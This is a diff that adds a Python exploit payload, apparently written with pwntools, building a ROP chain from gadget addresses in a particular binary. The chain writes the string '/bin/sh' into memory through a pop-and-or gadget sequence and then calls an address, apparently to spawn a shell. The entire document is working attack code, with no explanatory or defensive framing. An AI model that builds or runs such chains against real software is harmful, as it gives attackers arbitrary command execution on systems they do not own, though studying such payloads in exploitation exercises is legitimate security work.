@@ -1,0 +1,17 @@
+payload = p64(0x47d229)
+#0x000000000047d229: pop rax; ret; 
+payload += p64(0x773f2074)+p64(0x5dd222)
+# 0x00000000005dd222: pop rdi; ret; 
+payload += p64(0x6e69622f)+p64(0x632793)
+# 0x0000000000632793: or dword ptr [rax - 0x76b7001c], edi; ret; 
+payload += p64(0x47d229)
+# 0x000000000047d229: pop rax; ret; 
+payload += p64(0x773f2078)+p64(0x5dd222)
+# 0x00000000005dd222: pop rdi; ret; 
+payload += p64(0x68732f)+p64(0x632793)
+# 0x0000000000632793: or dword ptr [rax - 0x76b7001c], edi; ret; 
+payload += p64(0x5dd222)
+# 0x00000000005dd222: pop rdi; ret; 
+payload += p64(0x882058)+p64(0x4011c6)
+# call address 0x4011c6
+payload += p64(0x4011c6)
